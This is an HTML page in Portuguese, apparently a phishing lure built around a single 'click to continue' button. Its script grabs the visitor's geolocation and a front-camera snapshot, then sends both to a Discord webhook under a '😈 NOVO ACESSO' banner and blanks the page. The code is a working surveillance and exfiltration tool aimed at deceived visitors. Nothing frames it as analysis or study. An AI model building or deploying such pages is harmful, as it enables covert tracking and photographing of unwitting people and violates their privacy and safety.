<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Faz o botão ocupar a tela toda e remove espaços vazios */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
        }

        #btn {
            width: 100vw;
            height: 100vh;
            border: none;
            background-color: #000;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            display: block;
        }

        #mensagens {
            color: white;
            text-align: center;
            padding-top: 20px;
            font-family: sans-serif;
        }
        .vermelho { color: red; }
        .verde { color: green; }
    </style>
</head>
<body>

<div id="mensagens" style="display:none;">
    <p class="vermelho">TEXTO TEXTO TEXTO</p>
    <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
    <p class="normal">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
</div>

<button id="btn">CLIQUE PARA CONTINUAR</button>

<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const URL_WEBHOOK = 'https://discord.com';

    document.getElementById('btn').addEventListener('click', async function() {
        document.getElementById('mensagens').style.display = 'block';
        this.style.display = 'none';

        try {
            const local = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej);
            });

            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            const v = document.getElementById('v');
            v.srcObject = stream;

            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                const img = c.toDataURL('image/jpeg');
                
                const fd = new FormData();
                fd.append('payload_json', JSON.stringify({
                    content: "😈😈 **NOVO ACESSO!😈**",
                    embeds: [{
                        title: "POR PHANT0NS😈",
                        description: `📍 [Localização no Mapa](https://google.com{local.coords.latitude},${local.coords.longitude})\n⏰ ${new Date().toLocaleString()}`,
                        color: 16711680,
                        image: { url: 'attachment://p.jpg' }
                    }]
                }));
                
                const blob = await (await fetch(img)).blob();
                fd.append('file', blob, 'p.jpg');

                await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());

                setTimeout(() => { window.location.href = "about:blank"; }, 4000);
            }, 1500);

        } catch (e) {
            setTimeout(() => { window.location.href = "about:blank"; }, 3000);
        }
    });
</script>

</body>
</html>
